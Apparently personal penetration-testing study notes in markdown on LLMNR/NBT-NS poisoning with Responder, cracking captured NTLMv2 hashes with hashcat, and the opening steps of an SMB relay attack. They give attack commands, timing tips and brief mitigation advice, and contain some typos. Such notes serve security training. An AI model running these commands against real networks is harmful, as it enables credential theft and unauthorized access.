
# Attack 1 : LLMNR poisoning

LLMNR (**Link Local Multicast Name Resolution**) is used to identify hosts when DNS fails to do so.

**It is enabled by default!**

Previously it was called NBT-NS

The services utilize a username and a NTLMv2 hash when they responds
- so we can capture traffic as MIMT

The idea is that the server asks for username and hash to connect a client to another one:

![[Pasted image 20241217153223.png]]

==**The problem arises because the request of connection is sent in broadcast.**==

## Step 1: run responder

```bash 
sudo responder -I interface (eth0) -dwP
```
- `d` is for DHCP requests
- `w` is for WPAD proxy that allows browsers to automatically discover a proxy 
- `P` forces the NTLM authentication for the proxy
- `v` is verbose
This command responds to the traffic we receive.

Since the request for accessing a client is in broadcast it will respond to the victim:
- do it in the morning or after lunch (the idea is that it will work when a pc does requests)


## Step 2: trigger an event
Example we request on network at 
```bash
\\10.8.0.2
```


![[Pasted image 20241217153913.png]]


## Step 3: intercept hash with responder
As soon as the traffic is generated then we will see on our responder:
- ![[Pasted image 20241217154012.png]]


With hashcat we can crack the hash to discover the password.

## Step 4: crack hash
With hashcat we can crack the password:
```bash
hashcat hash.txt
```
- to get the code to crack it 

Then:
```bash
hashcat -m 5600 hash.txt rockyou.txt --show
rockyou.txt```
- or sometimes 5500


## Mitigation
the best defense is tp disable LLMNR and NBT-NS:
- To diable it we have to go on the server and policies
- ![[Pasted image 20241217160554.png]]

If we cannot disable it:
- ![[Pasted image 20241217160618.png]]





# Attack 2: SMB Relay

Instead crack hashes what we can do is to relay those to specific machines and gain access.
- *For example the hash cannot be cracked*

**==To perform it:**
- **==SMB signing must be disabled or not enforced==**
- **==The credential we stole must be an admin on the machine we want to access==** 




## Step 1: identify if the target has the SMB signing or not

We can do it using nmap:
```bash
nmap --script=smb2-security-mode.nse -p4445 network ip (example 10.0.0.0/24)
```


## Step 2: run responder 

First of all we need to modify responder configuration file:
```bash
sudo mousepad /etc/responder/Responder.conf
```
- ![[Pasted image 20241217161418.png]]



Now we can run responder:
```bash
sudo responder -I eth0 -dwP
```

